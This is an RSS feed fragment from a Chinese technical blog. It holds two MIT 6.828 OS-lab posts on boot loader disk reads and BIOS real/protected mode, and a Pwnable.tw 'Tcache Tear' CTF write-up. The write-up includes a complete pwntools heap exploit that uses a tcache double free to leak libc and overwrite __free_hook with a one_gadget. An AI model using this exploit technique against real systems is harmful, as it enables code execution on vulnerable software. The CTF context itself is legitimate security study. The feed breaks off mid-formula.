接下来三条语句是在为调用readsec函数做准备，把输入参数先压入栈中。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088366512/0" alt="image-20210126173010006"></p><p>​    接下来进入readsect函数中</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088392952/0" alt="image-20210126173427550"></p><p>​    readsect函数会调用一个子函数，waitdisk()，这个函数用于查询当前磁盘的状态是否已经准备好进行操作。如果没有准备好，那么程序就会一直停在这里，知道磁盘准备好</p><p>​    根据main.c文件中，我们可以看到在readsect函数中，waitdisk操作之后调用了一系列的outb子函数，这个子函数起始就是汇编语言中的outb汇编指令，它属于IO端口命令，IO端口指令用于向外部设备的端口输出指令，或从外部设备的端口读入数据。<strong>那么outb就是输出一个字节到指定端口。</strong></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088450428/0" alt="image-20210126174202756"></p><p>​    以第一个为例子，这先把端口号送入%edx，然后输出数据送入%al中，然后调用out汇编命令。</p><p>那么后边的命令就是完成后续的所有outb操作，只不过端口号和数据有所差别。<strong>通过这些指令可以看出，系统是先想0x1F2端口送入一个值1，代表取出一个扇区，然后向0x1F3~0x1F6中送入你要读取的扇区编号的32bit表示形式。最后向0x1F7端口输出0x20指令表示要读取这个扇区。</strong></p><p>那么输入完上述地址，指令到相应的端口后，就可以让磁盘自己去工作，此时系统只需调用waitdisk过程来等待磁盘完成读取。waitdisk退出后，代表数据已经被读取。然后就可以执行下一个指令了。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088473926/0" alt="image-20210126174607745"></p><p>​    下一个指令又是一个IO端口指令，insl，这个函数包含三个参数，port代表端口号，addr代表这个扇区存放在主存中的起始地址，cnt则代表读取的次数。repnz指令又叫做重复串操作指令，它是一个前缀，位于一条指令之前，这条指令将会一直被重复执行，并且直到计数寄存器的值满足某个条件。repnz指令是当计数器%ecx的值不为零是就一直重复后面的串操作指令。那么被重复调用的指令就是insl指令。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insl (%dx), %es:(%edi)</span><br></pre></td></tr></table></figure><p>这个指令中，%dx中存放着要访问的端口号，0x1f0。该指令的目的就是把端口0x1f0中的数据传输给后面所指向的地址。而后面的地址采用%es:(%edi)格式，其中%edi中存放的就是要被存放的内存空间的起始地址。由于当前计数寄存器%ecx中存放的数值为128，代表我们进行128次存取操作就能读取512byte的扇区。所以每次存取4个字节。我们调试验证下：</p><p>刚执行完cld指令后，查询寄存器信息。edx存放的是0x1f0端口号，edi存放的是pa起始地址，0x10000，存放在0x10000 ~ 0x10005的是：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088512998/0" alt="image-20210126175306126"></p><p>执行完一次insl操作后，端口号没变，而edi变成了0x10004，此时内容变成了：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088531899/0" alt="image-20210126175631635"></p><p>可见我们一次操作读取四个字节。所以我们只需要调用128次，就能完成512字节的存储。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088555629/0" alt="image-20210126180025347"></p><p>执行完后返回，这就是读取一个扇区readsect子函数的整个过程</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088585578/0" alt="image-20210126180509792"></p><p>readsect执行完后，又会继续执行<code>while (pa &lt; end_pa)</code>判断，如果还是小于，说明该段包含多个扇区，这些扇区还没有读取完成。当读取到end_pa之后，准备退出readset，最后执行readseg退出之前的操作：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088611173/0" alt="image-20210126180817331"></p><p>这里就是恢复bootmain函数的栈帧，回到bootmain中。</p><p>回到bootmain后，由于我们的这个操作读取出来的数据块是内核的第一个块，里面存放的是内核文件的elf文件头。所以我们下一步要做的事情是验证读出的文件是不是一个有效的elf文件？其中一个文件如果是有效的elf文件，那么这个文件的ELF文件头部的头四个字节分别是0x7f，’E’，’L’，’F’。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088905655/0" alt="image-20210126190604792"></p><p>紧接着是</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088910632/0" alt="image-20210126190654224"></p><p>0x7d3a指令完成是上面那条C语言操作的一部分。先把ELF文件头部e_phoff字段的值存入%eax。这个字段中存放的是Program Header Table（段头部表）的起始地址在文件中的偏移。而这个e_phoff字段是elf头部字段中的第28个字节到31个字节。所以起始地址是0x1000+1c = 0x1001c。所以%eax中存放着Program Header Table的起始地址的偏移。</p><p>0x7d3f指定就是把e_phnum字段的值，读入到%esi中，该字段代表代表Program Header Table中表项的个数。</p><p>在这里我们就知道了操作系统内核一共有多少个段，以及段表起始地址。通过info register指令查看，%esi的值为3，%eax的值为0x34，即52。可见操作系统内核文件一共3个段，段表起始地址在相对于内核文件起始地址的0x34处。而EFL文件头大小就是52，所以段表紧挨着ELF文件头。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13089086052/0" alt="image-20210126194728377"></p><p>接下来就是求出Program Header Table一共占了多少个字节，并得出Program Header Table最后一个存储单元的地址。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13089093176/0" alt="image-20210126194922938"></p><p>接下来就进入for循环，这个循环的操作就是要把内核的每一段从外存取到内存。其中%esi存放的是表尾地址，而%ebx存放的是当前访问到表中的位置。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13089111956/0" alt="image-20210126195345212"></p><p>for里的唯一操作是：ph当前存放的是一个Program Header Table中一个表项的起始地址。ph-&gt;p_pa字段就是p_paddr字段，代表这个段的将要被存放在这个系统的内存中的起始地址。ph-&gt;p_memsz字段，代表这个段被实际的装入内存后，它所占用的内存大小。ph-&gt;p_offset字段，代表这个段的起始地址距离整个内核文件起始地址的偏移。所以这个C语句的含义就是把这个表项所代表的段存放到ph-&gt;p_pa字段的所指的的内存地址处。</p><p>循环执行完后，操作系统内核中所有的指令，数据都已经转移到内存中。下面就是要执行最后一步</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13089138590/0" alt="image-20210126200015236"></p><p>其中ELF文件头的e_entry字段的含义是这个可执行文件的第一条指令的虚拟地址。所以这句的含义是把CPU的控制权转移给操作系统内核。</p><p>结束~</p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/23/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise3/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[Pwnable.tw]Tcache Tear</title>
      <link>https://billyotry.github.io/2021/01/23/[Pwnable.tw]Tcache%20Tear/</link>
      <guid>https://billyotry.github.io/2021/01/23/[Pwnable.tw]Tcache%20Tear/</guid>
      <pubDate>Sat, 23 Jan 2021 01:13:34 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;检查&quot;&gt;&lt;a href=&quot;#检查&quot; class=&quot;headerlink&quot; title=&quot;检查&quot;&gt;&lt;/a&gt;检查&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cl
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ file main</span><br><span class="line">main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]&#x3D;a273b72984b37439fd6e9a64e86d1c2131948f32, stripped</span><br><span class="line">$ checksec main</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;C7&#x2F;pwn&#x2F;tw&#x2F;tcache_tear&#x2F;main&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>64位动态链接，去符号表，got表不可写</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ strings libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so | grep GNU</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.</span><br><span class="line">Compiled by GNU CC version 7.3.0.</span><br></pre></td></tr></table></figure><p>libc为2.27</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先会输入一个名字会存到bss段上，然后就是常规的菜单题，malloc和free和info，这里的free只能对当前最新申请的chunk进行操作，info会打印bss段上0x20字节的内容。</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><ul><li><code>free()</code>没有对指针清零，存在UAF</li><li><code>add()</code>中读入的<code>size-16</code>参数经过<code>sub_400A25()</code>后由有符号变成了无符号，如果size是小于16的，那么转换后会变成一个很大的无符号数，存在溢出。</li></ul><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>做题的首要思路就是先考虑如何泄露出libc基址，一般的泄露方式就是申请一个chunk，释放后将其放入unsorted bin中。这里限制了chunk的size，即使我们填满了tcache后还是只能进入fast bin，没法进入unsorted bin中。默认情况下，tcache中的单链表个数是64个，64位下可容纳的最大内存块大小是1032(0x408)，故我们只要申请一个size大于0x408的堆块，然后free就会进入unsorted bin，而不会进入tcache。但是这里限制了申请大小，所以我们要伪造一个chunk，并将其释放。</p><p>这里需要注意的是<strong>除了伪造的size要大于0x408，并且伪堆块后面的数据也要满足基本的堆块格式，就是说还得伪造两个chunk。</strong>因为在free中，会对当前chunk后面的chunk进行一系列检查：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在 _int_free 函数中 </span></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123; </span><br><span class="line"><span class="comment">/* get and clear inuse bit */</span> </span><br><span class="line">nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br></pre></td></tr></table></figure><p>可以看到free函数对当前堆块的nextchunk也进行了相应的检查，并且还检查了nextchunk的xinuse位，到这里我们都以为只要伪造2个chunk就够了，但是nextchunk的inuse位的信息在nextchunk的nextchunk中，所以我们总共要伪造3个chunk。第一个chunk我们构造大小位0x500，第二个和第三个为0x20，它们的prev_inuse都为1，防止free后将它们合并。</p><p>这里我们具体的做法就是利用一开始的输入name，伪造好0x500的chunk后，在利用tcache的double free的特性（<strong>注意新版的2.27中加入了double free的检测</strong>），来达到任意地址申请堆块，相当于任意地址写，将后两个0x20的堆块伪造好，将伪造的0x500申请过来后释放即可，因为tcache不会check堆块的size，所以我们只需要fd指向的是伪造的chunk，不用担心size会被check。此时我们利用info功能将main_arena的地址打印出来后得到libc_base，然后继续利用tcache的double free将堆块申请到free_hook中，将free_hook改为one_gadget即可。</p><h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&#x27;chall.pwnable.tw&#x27;,10207)</span></span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;Data:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="number">0x602060</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x501</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Name:&#x27;</span>,payload)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">payload = p64(name + <span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x50</span>,payload)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> +p64(<span class="number">0</span>)+ p64(<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">payload = p64(name+<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x20</span>,payload)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">info()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name :&#x27;</span>)</span><br><span class="line">p.recv(<span class="number">0x10</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base= &quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;free_hook= &quot;</span>+<span class="built_in">hex</span>(free_hook)</span><br><span class="line">local_og = [<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line">remote_og = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget = libc_base + local_og[<span class="number">1</span>]</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0x40</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x40</span>,p64(one_gadget))</span><br><span class="line">free()</span><br><span class="line">p.sendline(<span class="string">&#x27;cd home&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;cd tcache_tear&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里就是个常规的菜单题，但是对于我来说一个不懂的点就是对于free掉的chunk的check，就是要还得检查当前chunk的nextchunk，然后这里的nextchunk的相关信息在nextchunk的nextchunk，所以伪造的时候要伪造3个。</p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/23/[Pwnable.tw]Tcache%20Tear/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT 6.828】Lab1-Exercise2</title>
      <link>https://billyotry.github.io/2021/01/22/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise2/</link>
      <guid>https://billyotry.github.io/2021/01/22/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise2/</guid>
      <pubDate>Fri, 22 Jan 2021 08:41:44 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;Lab-1-Exercise-2：&quot;&gt;&lt;a href=&quot;#Lab-1-Exercise-2：&quot; class=&quot;headerlink&quot; title=&quot;Lab 1 Exercise 2：&quot;&gt;&lt;/a&gt;Lab 1 Exercise 2：&lt;/h2&gt;&lt;h3 id=&quot;任务&quot;&gt;&lt;
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="Lab-1-Exercise-2："><a href="#Lab-1-Exercise-2：" class="headerlink" title="Lab 1 Exercise 2："></a>Lab 1 Exercise 2：</h2><h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>这里的练习是用gdb的’si’指令去调试并猜测它是做什么的</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先我们看第一条指令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 0xffff0:  ljmp $0xf000, $0xe05b  </span><br></pre></td></tr></table></figure><p>​    这是运行的第一条指令，是一条跳转指令，跳转到0xfe05b地址处，至于这个地址是怎么算出来的，在讲义中已经说过了。我们首先需要知道，PC机启动时，CPU运行在实模式下，而当进入操作系统内核后，就会设计到页表等的知识，这是在保护模式下运行了。实模式是早期CPU，比如8088处理器的工作模式，这类处理器由于只有20根地址线，所以它们只能访问1MB的内存空间。但是CPU也在不断的发展，之后的80286/80386已经具备32位地址总线，能够访问4GB内存空间，为了能够很好的管理这么大的内存空间，保护模式被研发出来。所以现代处理器都是工作在保护模式下的。但是为了实现向后兼容，即原来运行在8088处理器上的软件仍然能在现代处理器上运行，所以现代的CPU都是在启动时运行与实模式，启动完成后运行与保护模式。BIOS就是PC刚启动时运行的软件，所以它必然工作在实模式。</p><p>至于这两种工作模式的原理，可自行谷歌</p><p>实模式下指令中出现的地址都是采用（段基址：段内偏移）的形式，其中这两个字段的值，通常是存放寄存器中的。其中段基址必须放在段寄存器中，包括CS(代码段), DS(数据段), SS(堆栈段), ES(扩展段)。不同的段寄存器存放的是你程序不同的段的起始地址。</p><p>但是由于8088CPU中寄存器都是16位，而CPU地址总线是20位的，我们怎么通过16位的寄存器去拼接20位的地址呢？所以我们需要采用下面的方法：<strong>把段寄存器中的值左移4位（也就是乘16），形成20位段基址，然后和16位段内偏移相加，就得到了真实地址。</strong>比如上面的指令中段寄存器的内容为0xf000，所以真实地址为 0xf000&lt;&lt;4+0xe05b = 0xfe05b。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2. 0xfe05b: cmpl $0x0, $cs:0x6ac8</span><br></pre></td></tr></table></figure><p>​    下一条指令，把0x0这个立即数和$cs:0x6ac8所代表的内存地址处的值所比较，<strong>至于为什么比较，俺不知道</strong>。其中$cs:0x6ac8就是我们刚刚介绍的实模式下地址形成的格式</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3. 0xfe062:  jne  0xfd2e1</span><br></pre></td></tr></table></figure><p>​    jne指令：如果ZF标志位为0的时候跳转，即上一条指令cmpl的结果不是0时跳转，也就是$cs:0x6ac8地址处的值不是0x0时跳转。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4. 0xfe066:  xor  %dx, %dx</span><br></pre></td></tr></table></figure><p>​    下条指令的地址是0xfe066，可见上面的跳转指令没有跳转。这条指令的功能是把dx寄存器清零。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5. 0xfe068:  mov  %dx %ss</span><br><span class="line">6. 0xfe06a:  mov  $0x7000, %esp</span><br><span class="line">7. 0xfe070:  mov  $0xf34d2, %edx</span><br><span class="line">8. 0xfe076:  jmp  0xfd15c</span><br><span class="line">9. 0xfd15c:  mov  %eax, %ecx</span><br></pre></td></tr></table></figure><p>​    接下来就是设置一些寄存器的值，<strong>具体含义俺不知道</strong>，注意第8条，进行了绝对跳转。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10. 0xfd15f:  cli</span><br></pre></td></tr></table></figure><p>​    <strong>关闭中断指令</strong>。这个比较好理解，启动时的操作是比较关键的，所以肯定是不能被中断的。这个关中断指令用于关闭那些可以屏蔽的中断。比如大部分硬件中断。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11. 0xfd160:  cld</span><br></pre></td></tr></table></figure><p>​    设置方向标识(DF)为0，表示后续的串操作比如MOVS操作，内存地址的变化方向，如果为0代表从低地址值变为高地址。具体什么是串操作，自行谷歌。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12. 0xfd161:  mov  $0x8f, %eax</span><br><span class="line">13. 0xfd167:  out  %al, $0x70</span><br><span class="line">14. 0xfd169:  in  $0x71, %al</span><br></pre></td></tr></table></figure><p>​    这三个操作中涉及到两个新指令out，in。这两个操作用于操作IO端口的。这种IO端口的操作后续会经常接触到，这里大致说下。</p><p>​    CPU与外部设备通讯时，通常是通过访问、修改设备控制器中的寄存器来实现的。那么这些位于设备控制器中的寄存器也叫做<strong>IO端口</strong>。为了方便管理，80x86CPU采用IO端口单独编址的方式，即所有设备的端口都被命名到一个IO端口地址空间中。这个空间是独立于内存地址空间的。所以必须采用和访问内存的指令不一样的指令来访问端口。</p><p>​    所以这里引入in，out操作：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">in %al，PortAddress向端口地址为PortAddress的端口写入值，值为al寄存器中的值</span><br><span class="line">out PortAddress，%al把端口地址为PortAddress的端口中的值读入寄存器al中</span><br></pre></td></tr></table></figure><p>​    <strong>标准规定端口操作必须要用al寄存器作为缓冲</strong></p><p>​    那么这三条指令就是要操作端口0x70，0x71，它们对应的是什么设备呢。根据下面的链接查询</p><p><a href="http://bochs.sourceforge.net/techspec/PORTS.LST">http://bochs.sourceforge.net/techspec/PORTS.LST</a></p><p>​    从中可以知道，0x70端口和0x71端口是用于控制系统中一个叫CMOS的设备，这个设备是一个低功耗的存储设备，它可以用于在计算机时存储一些信息，它是由独立的电池供电的。这里有详细介绍<a href="https://wiki.osdev.org/CMOS">https://wiki.osdev.org/CMOS</a></p><p>​    这个CMOS中可以控制跟PC相关的多个功能，其中最重要的就是<strong>时钟设备</strong>的，它还可以控制是否<strong>响应不可屏蔽中断</strong>。</p><p>​    操作CMOS存储器中的内容需要两个端口，一个是0x70另一个就是0x71。其中0x70可以叫做索引寄存器，<strong>这个8位寄存器是不可屏蔽中断（NMI）使能位。如果你把这个位置1，则NMI不会被响应。低七位用于指定CMOS存储器中的存储单元地址**</strong>，所以如果你想访问第1号存储单元，并且在访问时，我要使能NMI，那么你就应该向端口0x70里面送入10000001=0x81。</p><p>即</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov $0x81, %al</span><br><span class="line">out %al, 0x70</span><br></pre></td></tr></table></figure><p>​    然后对于这个地址单元的操作，比如读或者写就可以由0x71端口完成，比如你现在想从1号存储单元里面读出它的值，在完成上面的两条指令后，就可以下面输入这条指令　</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">in $0x71, %al </span><br></pre></td></tr></table></figure><p>​    再回到我们的系统，这三条指令可以看出，它首先关闭了NMI中断，并且要访问存储单元0xF的值，并且把值读到al中，但是在后面我们发现这个值并没有被利用，所以可以认为这三条指令是用来关闭NMI中断的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">15. 0xfd16b:  in  $0x92, %al</span><br><span class="line">16. 0xfd16d:  or  $0x2, %al</span><br><span class="line">17. 0xfd16f:  out  %al, $0x92</span><br></pre></td></tr></table></figure><p>​    这三步操作又是在控制端口，此时被控制的端口是0x92，通过上面的链接我们可以查到，它控制的是PS/2系统控制端口A，而第16，17步的操作明显是把这个端口的1号bit置为1。这个端口的bit1的功能是</p><p>​        <code>bit 1 = 1 indicates A20 active</code></p><p>​    即A20位，即第21个地址线被使能，了解过实模式和保护模式的肯定知道，如果A20地址线被激活，那么系统工作在保护模式下，但是在boot loader程序中，计算机首先要工作在实模式下。所以这里的操作应该是测试可用内存空间。在boot loader之前，它肯定还会转回实模式。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">18. 0xfd171:  lidtw  %cs:0x6ab8</span><br></pre></td></tr></table></figure><p>​    lidt指令：加载中断向量表寄存器（IDTR）。这个指令会把从地址0xf6ab8起始的后面6个字节的数据读入到中断向量表寄存器（IDTR）中。中断是操作系统中非常重要的一部分，有了中断操作系统才能真正实现进程。每一种中断都有自己对应的中断处理程序，那么这个中断的处理程序的首地址就叫做这个中断的中断向量。中断向量表自然是存放所有中断向量的表了。关于中断向量表的介绍，可以查看<a href="http://wiki.osdev.org/Interrupt_Descriptor_Table">http://wiki.osdev.org/Interrupt_Descriptor_Table</a> </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">19. 0xfd177:  lgdtw  %cs:0x6a74</span><br></pre></td></tr></table></figure><p>​    把从0xf6a74为起始地址处的6个字节的值加载到全局描述符表格寄存器GDTR中。这个表是实现保护模式非常重要的一部分，我们在介绍boot loader时会具体介绍它。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">20. 0xfd17d:  mov  %cr0, %eax</span><br><span class="line">21. 0xfd180:  or  $0x1, %eax</span><br><span class="line">22. 0xfd184:  mov  %eax, %cr0</span><br></pre></td></tr></table></figure><p>​    计算机中包含<code>CR0 ~ CR3</code>四个控制寄存器，用来控制和确定处理器的操作模式。其中这三个语句的操作明显是要把CR0寄存器的最低位（0bit）置1。CR0寄存器的0bit是PE位，启动保护位，当该位被置1，代表开启了保护模式。但是这里出现了问题，我们刚刚说过BIOS是工作在实模式下，后面的boot loader开始的时候也是工作在实模式下，所以这里切换为保护模式，显然是自相矛盾。所以这里只能推测它在检测机器是否能工作在保护模式下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">23. 0xfd187:  ljmpl $0x8, $0xfd18f</span><br><span class="line">24. 0xfd18f:  mov  $0x10, %eax</span><br><span class="line">25. 0xfd194:  mov  %eax, %ds</span><br><span class="line">26. 0xfd196:  mov  %eax, %es</span><br><span class="line">27. 0xfd198:  mov  %eax, %ss</span><br><span class="line">28. 0xfd19a:  mov  %eax, %fs</span><br><span class="line">29. 0xfd19c:  mov  %eax, %gs</span><br></pre></td></tr></table></figure><p>这里的23~29步之所以这么做是按照规定来的，<a href="https://en.wikibooks.org/wiki/X86_Assembly/Global_Descriptor_Table">https://en.wikibooks.org/wiki/X86_Assembly/Global_Descriptor_Table</a> 链接中指出，要完成加载GDTR的过程需要重新加载段寄存器，即如果刚刚加载完GDTR寄存器我们必须要重新加载所有的段寄存器的值，而其中CS段寄存器必须通过长跳转指令，即23号指令来进行加载。所以这些步骤是在第19步完成后必须要做的。这样才能是GDTR的值生效。</p><p>目前只能分析到这里。</p><h2 id="Appendix：实模式和保护模式"><a href="#Appendix：实模式和保护模式" class="headerlink" title="Appendix：实模式和保护模式"></a>Appendix：实模式和保护模式</h2><p>首先我们要知道这两种模式都是CPU的工作模式，实模式是早期CPU运行的工作模式，而保护模式则是现代CPU运行的模式。但是为什么现代CPU在运行boot loader时仍旧要先进入实模式呢？就是为了实现软件的向后兼容性不得已才这样的。</p><p>下面我们分别看下这两种工作模式的基本原理。</p><p><strong>实模式</strong></p><p>实模式出现于早期8086CPU时期。当时由于CPU的性能有限，一共只有20位地址线（所以地址空间只有1MB），以及8个16位的通用寄存器，以及4个16位的段寄存器。所以为了能够通过这些16位的寄存器去构成20位的主存地址，必须采用一种特殊的方式。当某个指令想要访问某个内存地址时，它通常需要用下面的这种格式来表示：（段基址：段偏移量）</p><p>其中第一个字段是段基址，它的值是由段寄存器提供的。段寄存器有4种，%cs，%ds，%ss，%es。具体这个指令采用哪个段寄存器是由这个指令的类型来决定的。比如要取指令就是采用%cs寄存器，要读取或者写入数据就用%ds寄存器。总之，不管什么指令，都会有一个段寄存器提供一个16位的段基址。</p><p>第二个字段是段内偏移量，代表你要访问的这个内存地址距离这个段基址的距离。它的值就是由通用寄存器来提供的，所以也是16位。那么问题来了：两个16位的值如何组合成一个20位的地址呢？这里采用的方式是把段寄存器所提供的段基址先向左移4位。这样就变成了一个20位的值，然后再与段偏移量相加。所以公式如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">物理地址 &#x3D; 段基址 &lt;&lt; 4 + 